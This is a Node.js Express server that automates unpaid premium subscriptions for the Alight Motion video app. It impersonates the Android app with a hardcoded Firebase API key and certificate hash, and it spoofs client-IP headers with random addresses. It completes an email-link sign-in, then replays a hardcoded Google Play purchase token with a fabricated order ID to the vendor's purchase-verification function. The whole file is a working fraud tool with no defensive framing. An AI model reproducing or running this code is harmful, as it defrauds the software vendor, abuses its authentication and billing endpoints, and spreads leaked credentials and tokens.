const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const zlib = require('zlib');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

const KEY = 'AIzaSyDtG1AU22ErnQD60AzBAcaknySiz9_CEq0';
const IDENTITY_TOOLKIT = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty';
const VERIFY_PURCHASE = 'https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase';

const ANDROID_HEADERS = {
    'content-type': 'application/json',
    'x-android-package': 'com.alightcreative.motion',
    'x-android-cert': 'ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8',
    'user-agent': 'dalvik/2.1.0 (linux; u; android 15; 23127pn0cc build/bp1a.250505.005)'
};

const OKHTTP_HEADERS = {
    'content-type': 'application/json; charset=utf-8',
    'user-agent': 'okhttp/3.12.1',
    'accept-encoding': 'gzip'
};

// ---------- helper ----------
function randomIP() {
    return Array.from({ length: 4 }, () => Math.floor(Math.random() * 254) + 1).join('.');
}

function spoofHeaders(headers) {
    const h = { ...headers };
    for (const k of [
        'x-forwarded-for', 'x-real-ip', 'client-ip', 'x-client-ip',
        'x-originating-ip', 'x-cluster-client-ip'
    ]) {
        h[k] = randomIP();
    }
    return h;
}

function grabOobCode(raw) {
    if (!raw) return null;
    let cleaned = String(raw).replace(/&amp;/g, '&');
    try { cleaned = decodeURIComponent(cleaned); } catch (_) {}

    // coba parse query
    try {
        const qs = new URLSearchParams(cleaned.split('?')[1] || '');
        let code = qs.get('oobCode');
        if (!code) {
            const nested = qs.get('link') || qs.get('q') || qs.get('url');
            if (nested) {
                const nqs = new URLSearchParams(nested.split('?')[1] || '');
                code = nqs.get('oobCode');
            }
        }
        if (code) return code.replace(/[^a-zA-Z0-9_-]/g, '');
    } catch (_) {}

    const m = cleaned.match(/oobCode=([a-zA-Z0-9_-]+)/i);
    if (m) return m[1];

    const trimmed = raw.trim();
    if (/^[a-zA-Z0-9_-]{10,}$/.test(trimmed) && !trimmed.includes('://')) {
        return trimmed;
    }
    return null;
}

// ---------- flow ----------
async function sendVerificationEmail(email) {
    const createBody = { identifier: email, continueUri: 'http://localhost' };
    const oobBody = {
        requestType: 6,
        email: email,
        androidInstallApp: true,
        canHandleCodeInApp: true,
        continueUrl: 'https://alightcreative.com?ui_sid=0366624874&ui_sd=0',
        iosBundleId: 'com.alightcreative.motion',
        androidPackageName: 'com.alightcreative.motion',
        androidMinimumVersion: '585',
        clientType: 'CLIENT_TYPE_ANDROID'
    };

    await axios.post(
        `${IDENTITY_TOOLKIT}/createAuthUri?key=${KEY}`,
        createBody,
        { headers: spoofHeaders(ANDROID_HEADERS), timeout: 15000 }
    );

    const resp = await axios.post(
        `${IDENTITY_TOOLKIT}/getOobConfirmationCode?key=${KEY}`,
        oobBody,
        { headers: spoofHeaders(ANDROID_HEADERS), timeout: 15000 }
    );
    return resp.data;
}

async function signInWithEmailLink(email, rawLink) {
    const oobCode = grabOobCode(rawLink);
    if (!oobCode) throw new Error('oobCode not found');

    const resp = await axios.post(
        `${IDENTITY_TOOLKIT}/emailLinkSignin?key=${KEY}`,
        { email, oobCode, clientType: 'CLIENT_TYPE_ANDROID' },
        { headers: spoofHeaders(ANDROID_HEADERS), timeout: 15000 }
    );
    return resp.data;
}

async function promoteToPremium(idToken) {
    const rand = crypto.randomBytes(6).toString('base64url').toLowerCase();
    const orderId = 'neo-' + rand;

    const body = {
        data: {
            productId: 'am.full.sub.annual.19q4',
            token: 'mmgaobamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw',
            skuType: 'subs',
            orderId: orderId
        }
    };

    const headers = spoofHeaders(OKHTTP_HEADERS);
    headers['authorization'] = 'Bearer ' + idToken;
    headers['firebase-instance-id-token'] =
        'cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI';

    const resp = await axios.post(VERIFY_PURCHASE, body, {
        headers,
        timeout: 15000,
        decompress: true
    });
    return { orderId, data: resp.data };
}

// ---------- endpoint ----------

// 1. Kirim magic link
app.post('/api/satriam/send-link', async (req, res) => {
    try {
        const email = req.body?.email;
        if (!email) return res.status(400).json({ success: false, error: 'email required' });

        const data = await sendVerificationEmail(email);
        res.json({ success: true, data });
    } catch (err) {
        res.status(err.response?.status || 500).json({
            success: false,
            error: err.response?.data || err.message
        });
    }
});

// 2. Verify link + promote premium
app.post('/api/satriam/verify-link', async (req, res) => {
    try {
        const { email, link } = req.body || {};
        if (!email || !link) {
            return res.status(400).json({ success: false, error: 'email & link required' });
        }

        const auth = await signInWithEmailLink(email, link);
        const idToken = auth?.idToken;
        if (!idToken) {
            return res.status(400).json({ success: false, error: 'no idToken', data: auth });
        }

        const promote = await promoteToPremium(idToken);

        res.json({
            success: true,
            idToken,
            orderId: promote.orderId,
            promote: promote.data
        });
    } catch (err) {
        res.status(err.response?.status || 500).json({
            success: false,
            error: err.response?.data || err.message
        });
    }
});

module.exports = app;
